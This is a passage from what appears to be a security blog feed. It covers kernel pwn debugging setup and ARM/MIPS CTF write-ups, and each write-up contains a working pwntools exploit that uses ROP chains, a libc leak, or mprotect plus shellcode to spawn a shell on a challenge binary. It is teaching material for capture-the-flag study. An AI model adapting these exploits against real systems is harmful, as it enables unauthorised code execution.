<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s: open port 1234</span><br><span class="line">-S: waiting for debugger attachment</span><br><span class="line">-gdb tcp::2345</span><br></pre></td></tr></table></figure>

<p>And a script to quickly connect</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gdb \</span><br><span class="line">-ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;add-symbol-file ./xxx.ko 0xdeadbeef&quot;</span> \</span><br></pre></td></tr></table></figure>

<p>And some key files &amp; commands to get info:</p>
<ul>
<li><code>cat /proc/modules</code>: see loaded kernel modules</li>
<li><code>cat /proc/kallsyms</code>: see all kernel symbols</li>
<li><code>cat /sys/module/xxx/sections</code>: list sections of module <code>xxx</code> </li>
<li><code>dmesg</code>: see kernel logs, where <code>printk()</code> prints</li>
<li><code>cat /proc/kallsyms |grep commit_creds</code> &amp; <code>cat /proc/kallsyms |grep prepare_kernel_cred</code>: get the two funcs addrs</li>
</ul>
<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><p>Here are scripts for packing and unpacking:<br><code>unpack.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mkdir unzip</span><br><span class="line">cp rootfs.cpio.gz ./unzip/</span><br><span class="line">cd unzip</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt;rootfs.cpio</span><br><span class="line">rm -rf rootfs.cpio</span><br></pre></td></tr></table></figure>
<p><code>repack.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">cd unzip</span><br><span class="line">find . | cpio -ov -H newc | gzip -<span class="number">9</span> &gt; ../rootfs2.cpio.gz</span><br></pre></td></tr></table></figure>

<p>If we do experiments locally, we can pack the exploit binary into filesystem image, and see it in the system when booting, while when interacting with remote, we cannot alternate remote filesystem.</p>
<p>Therefore we copy exploit binary to remote via interaction shell, and here is a script to facilitate it:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">r</span>):</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./poc/exp &gt; ./poc/exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./poc/exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    <span class="comment">#r.sendlineafter(cmd, &#x27;./exp&#x27;)</span></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>qemu</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM &amp; MIPS PWN Intro</title>
    <url>/2021/07/30/2021-07-30-ARM-MIPS-PWN-Intro/</url>
    <content><![CDATA[<p>This paragraph is to pwn <code>ARM</code> and <code>MIPS</code> binaries, with some examples. </p>
<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Basically binaries are executed by <code>QEMU</code>, so some operations in <a class="link"   href="http://localhost:4000/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/" >QEMU Intro and Network Configuration<i class="fas fa-external-link-alt"></i></a> are needed.</p>
<p>Add another one. The tool <a class="link"   href="https://github.com/nongiach/arm_now" >arm_now<i class="fas fa-external-link-alt"></i></a> on github is wrapped to build the environment.</p>
<h3 id="Install-Shared-Library"><a href="#Install-Shared-Library" class="headerlink" title="Install Shared Library"></a>Install Shared Library</h3><p>We can search by</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt search <span class="string">&quot;libc6-&quot;</span> | grep <span class="string">&quot;&#123;ARCH&#125;&quot;</span> <span class="comment"># `ARCH` can be arm, mips...</span></span><br></pre></td></tr></table></figure>
<p>What we need are packages like <code>libc6-&#123;ARCH&#125;-cross</code>. </p>
<p>As mentioned in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/">QEMU Intro and Network Configuration</a> before, the packages like <code>gcc-&#123;ARCH&#125;-linux-gnuxxx</code> also provides shared libraries.</p>
<p>All above libs are stored as <code>/usr/&#123;ARCH&#125;-linux-gnuxxx</code>.</p>
<p>Or visit <a class="link"   href="https://toolchains.bootlin.com/toolchains.html" >toolchains.bootlin.com<i class="fas fa-external-link-alt"></i></a> to get ready-built libc files including <code>glib</code>, <code>musl</code> and <code>uclibc</code>.</p>
<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Here I mean IDA. We need plugins for MIPS. The <a class="link"   href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" >MIPSROP<i class="fas fa-external-link-alt"></i></a> only supports IDA 6.7 and lower versions, because API changed in IDA, but there’s a researcher wrote <a class="link"   href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop" >this new one<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Disassembler plugin we use <a class="link"   href="https://github.com/avast/retdec-idaplugin" >Retdec<i class="fas fa-external-link-alt"></i></a> for IDA, <a class="link"   href="https://github.com/pnfsoftware/PleaseROP" >Please ROP<i class="fas fa-external-link-alt"></i></a> for <a class="link"   href="https://www.pnfsoftware.com/jeb2/mips" >jeb2<i class="fas fa-external-link-alt"></i></a>, and <a class="link"   href="https://binary.ninja/" >Binary Ninja<i class="fas fa-external-link-alt"></i></a>. </p>
<p>As for ARM, Hex-Rays Decompiler plugin supports ARM, even MIPS now. So IDA Pro 7.5 can disassemble both ARM and MIPS at this moment.</p>
<h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>The <code>gdb</code> is what we need.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install gdb-multiarch <span class="comment"># same usage as gdb</span></span><br></pre></td></tr></table></figure>
<p>With shared library installed, we can assign them to program by <code>-L</code> like</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./program</span><br></pre></td></tr></table></figure>
<p>Use <code>-g</code> to open ports</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</span><br></pre></td></tr></table></figure>
<p>Then in <code>gdb-multiarch</code> (with <a class="link"   href="https://github.com/pwndbg/pwndbg" >pwndbg<i class="fas fa-external-link-alt"></i></a>), set architecture and connect </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture mips </span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
<p>This part is also included in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/#Debug-Programs"><code>Debug Programs</code> part of QEMU Intro and Network Configuration</a>.</p>
<h2 id="CTF-Examples"><a href="#CTF-Examples" class="headerlink" title="CTF Examples"></a>CTF Examples</h2><p>Here gives some preliminary multi-arch ctf challenges</p>
<h3 id="Jarvis-oj-typo-ARM"><a href="#Jarvis-oj-typo-ARM" class="headerlink" title="Jarvis oj - typo - ARM"></a>Jarvis oj - typo - ARM</h3><p>Attachment: <a href="/filehost/ampi/typo">typo</a><br>Check the file first (arm-32-little)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">$ checksec typo</span><br><span class="line">[*] &#x27;/root/typo&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>
<p>It is a static linked armel-32bit-program. </p>
<p>When testing we find a long string overflows the <code>program</code>. Then we calculate the padding by using <code>qemu</code> and <code>cyclic</code>.</p>
<p>But the code is obfuscated, we have trouble figuring out the main logic, while we find <code>/bin/sh</code> at <code>.rodata:0006C384</code>. And according to the cross reference of it,we can find <code>sub_10BA8 (0x10BA8)</code> (someone find <code>sub_110B4 (0x110B4)</code>) which turns out to be <code>system()</code>.</p>
<p>Then we need a gadget to control <code>$r0</code> and find <code>0x00020904 : pop &#123;r0, r4, pc&#125;</code> using <code>ROPgadget</code>. So we build the stack </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   padding  |</span><br><span class="line">|            |</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br><span class="line">| gadget_addr| &lt;- 0x20904</span><br><span class="line">+------------+</span><br><span class="line">| binsh_addr | &lt;- 0x6C384</span><br><span class="line">+------------+</span><br><span class="line">| junk_data  |</span><br><span class="line">+------------+</span><br><span class="line">| system_addr| &lt;- 0x10BA8 # 0x110B4</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
<p>Exploit</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;typo&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process(filename)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;quit\n&quot;</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">bin_sh_str = <span class="number">0x6c384</span></span><br><span class="line">system_addr = <span class="number">0x10BA8</span> <span class="comment"># 0x110B4</span></span><br><span class="line">pop_04pc = <span class="number">0x20904</span>   <span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding+p32(pop_04pc)+p32(bin_sh_str)+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;\n&quot;</span>,payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Codegate2018-melong-ARM"><a href="#Codegate2018-melong-ARM" class="headerlink" title="Codegate2018 - melong - ARM"></a>Codegate2018 - melong - ARM</h3><p>Attachment: <a href="/filehost/ampi/melong">melong</a><br>Check file infomation (still arm)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file melong</span><br><span class="line">melong: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2c55e75a072020303e7c802d32a5b82432f329e9, not stripped</span><br><span class="line">$ checksec melong</span><br><span class="line">[*] &#x27;/root/melong&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
<p>After reading the pseudocode we can find that in <code>write_diary()</code>, we can give the <code>read()</code> a large size to write to stack and achieve an overflow in <code>main()</code> function frame.</p>
<p>But before that we have to enter <code>PT()</code> to set size. It has to be negative to pass a comparision statement, and the negative value is regarded as a fairly large unsigned integer.</p>
<p>After that we enter <code>write_diary()</code> to do <code>rop</code>: first leak <code>libc</code> address, then control it to execute <code>system(&quot;/bin/sh</code>“). </p>
<p>The next challenge is to go back to <code>main()</code>. The <code>rop</code> in <code>ARM</code> is different from <code>x86</code> because it has no <code>ret</code> instruction. So hijacking program flow is to control <code>$pc</code>.</p>
<p>We cannot control the program flow just using <code>rop</code> gadgets we give, the only way is to follow the program running and find some <code>pop $regs</code> to control regs (especially <code>$pc</code>). </p>
<p>Brute forcing can be used to guess how many paddings we need to loop back to main (using <code>cyclic</code> or so, same as how we determine offset in stack overflow), another more preliminary method is to debug step by step and find the significant. gadget: <code>&lt;puts+400&gt;:    pop    &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;</code>.</p>
<p>Exploit</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">libcpath = <span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libcpath)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabi ./melong&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;1\n1.8\n80\n&quot;</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;3\n-123\n&quot;</span>)       <span class="comment"># personal training</span></span><br><span class="line">pad = <span class="number">0x54</span></span><br><span class="line">pop_0pc = <span class="number">0x00011bbc</span> <span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line">leak = <span class="string">b&#x27;a&#x27;</span>*pad + p32(pop_0pc) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">leak += flat(elf.sym[<span class="string">&#x27;main&#x27;</span>])*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">b&quot;4\n&quot;</span>+leak)        <span class="comment"># write_diary</span></span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;===============================================================================&quot;</span>)</span><br><span class="line">raw_puts = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = raw_puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;1\n1.8\n80\n&quot;</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;3\n-123\n&quot;</span>)       <span class="comment"># personal training</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*pad + p32(pop_0pc) + p32(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">b&quot;4\n&quot;</span>+payload)        <span class="comment"># write_diary</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Shanghai2018-baby-arm-aarch64"><a href="#Shanghai2018-baby-arm-aarch64" class="headerlink" title="Shanghai2018 - baby_arm - aarch64"></a>Shanghai2018 - baby_arm - aarch64</h3><p>Attachment: <a href="/filehost/ampi/baby_arm">baby_arm</a><br>Still check the file (aarch64 aka. arm64)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file baby_arm</span><br><span class="line">baby_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br><span class="line">$ checksec baby_arm</span><br><span class="line">[*] &#x27;/root/baby_arm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>All we have to notice is just <code>main_logic()</code> and <code>sub_4007F0()</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">main_logic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v0; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Name:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  v0 = <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">sub_4007F0</span>(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_4007F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Easy to determine the offset using <code>cyclic</code> and we find the <code>NX enabled</code>. And the <code>mprotect()</code> exists and it sets the privilege digit as <code>0</code> which means no execution.</p>
<p>We can also use it to set <code>bss</code> as <code>writable</code> and <code>executable</code> using <code>mprotect()</code>. Here we use the powerful <code>csu gadget</code> to call any functions with any args, using gadgets in <code>_libc_csu_init()</code>.</p>
<p>So the whole pass is: write <code>shellcode</code> to <code>bss</code>; use <code>mprotect()</code> to set <code>bss</code> executable; finally call <code>shellcode</code>.</p>
<p>Exploit</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;qemu-aarch64 -L /usr/aarch64-linux-gnu/ pwn&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span>(<span class="params">call, x0, x1, x2</span>):</span> </span><br><span class="line">    payload = flat(<span class="number">0x4008CC</span>, <span class="string">&#x27;00000000&#x27;</span>, <span class="number">0x4008ac</span>, <span class="number">0</span>, <span class="number">1</span>, call)</span><br><span class="line">    payload += flat(x2, x1, x0)</span><br><span class="line">    payload += <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">padding = asm(<span class="string">&#x27;mov x0, x0&#x27;</span>)</span><br><span class="line">shell = asm(shellcraft.execve(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,padding*<span class="number">0x10</span>+shell)</span><br><span class="line">payload1 = flat(cyclic(<span class="number">72</span>)+csu_rop(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>],<span class="number">8</span>))  <span class="comment"># change got</span></span><br><span class="line">payload1 += flat(<span class="number">0x400824</span>)  <span class="comment"># main_logic</span></span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.send(flat(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,padding*<span class="number">0x10</span>+shell)</span><br><span class="line">payload2 = flat(cyclic(<span class="number">72</span>)+csu_rop(elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>)) <span class="comment"># call mprotect</span></span><br><span class="line">payload2 += flat(<span class="number">0x411068</span>)  <span class="comment"># shellcode</span></span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="HWS2020-Mplogin-mipsel"><a href="#HWS2020-Mplogin-mipsel" class="headerlink" title="HWS2020 - Mplogin - mipsel"></a>HWS2020 - Mplogin - mipsel</h3><p>Attachment: <a href="/filehost/ampi/Mplogin.zip">Mplogin</a><br>Check this file (mipsel)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file Mplogin</span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line">$ checksec Mplogin</span><br><span class="line">[*] &#x27;/root/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>In <code>main()</code> it gets 2 functions:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>, envp);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">sub_400840</span>();</span><br><span class="line">  <span class="built_in">sub_400978</span>(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now you getshell~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In <code>sub_400840()</code> it can leak sth on stack because no processing the last byte:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400840</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In <code>sub_400978()</code> it has an overflow (it can control size of second <code>read()</code>) which lets us write :</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400978</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We try to debug dynamically using <code>qemu</code></p>
